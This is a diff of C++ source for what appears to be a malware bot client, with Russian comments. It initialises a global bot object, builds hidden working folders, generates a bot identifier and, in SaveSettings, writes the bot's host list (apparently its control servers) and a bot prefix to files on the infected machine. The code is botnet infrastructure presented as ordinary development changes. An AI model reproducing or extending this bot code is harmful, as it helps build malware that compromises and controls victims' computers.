@@ -5,11 +5,12 @@
 #include "BotUtils.h"
 #include "HTTPConsts.h"
 #include "BotDef.h"
+#include "BotHosts.h"
 #include "DbgRpt.h"
 
 //---------------------------------------------------------------------------
 
-TBotApplication* Bot;
+TBotApplication* Bot = NULL;
 
 //---------------------------------------------------------------------------
 #define MAX_BOT_WORK_FOLDER_LEN 15
@@ -43,18 +44,26 @@ char BOT_UID[128];
 
 TBotApplication::TBotApplication()
 {
+	// Инициализируем глобальный объект
+	Bot = this;
+
+
 	// Инициализируем глобальные настройки бота
 	FTerminated = false;
 
 	// Определяем PID процесса
 	FPID = GetUniquePID();
 
-	// Получаем идентификатор бота
-	FUID = GenerateBotID2();
-
 	// Определяем имя процесса в котором работает бот
 	pGetModuleFileNameA(NULL, FApplicationName.t_str(), MAX_PATH);
 	FApplicationName.CalcLength();
+
+	// Генерируем рабочие пути
+	FWorkPath       = MakeWorkPath(false);
+	FWorkSystemPath = MakeWorkPath(true);
+
+	// Получаем идентификатор бота
+	FUID = GenerateBotID2();
 }
 //-------------------------------------------------------------
 
@@ -108,6 +117,18 @@ string TBotApplication::WorkSystemPath()
 	return FWorkSystemPath;
 }
 //-------------------------------------------------------------
+
+string TBotApplication::PrefixFileName()
+{
+	// Функция возвращает имя файла для хранения префикса
+	if (FPerfixFileName.IsEmpty())
+	{
+		FPerfixFileName = WorkSystemPath();
+        FPerfixFileName += FILE_PREFIX;
+	}
+	return FPerfixFileName;
+}
+//----------------------------------------------------------------------------
 
 
 PCHAR TBotApplication::GetWorkFolder()
@@ -169,12 +190,19 @@ string TBotApplication::MakeWorkPath(bool SystemPath)
 void TBotApplication::SaveSettings()
 {
 	// Функция сохраняет базовые настройки
+
+	// Сохраняем хосты
+	PCHAR HostsName = Hosts::GetFileName();
+	if (!FileExistsA(HostsName))
+		SaveHostsToFile(HostsName);
+	STR::Free(HostsName);
+
+	// Сохраняем префикс
+	string PrefixFile = PrefixFileName();
+	if (!FileExistsA(PrefixFile.t_str()))
+		SavePrefixToFile(PrefixFile.t_str());
 }
 //----------------------------------------------------------------------------
-
-
-
-
 
 
 
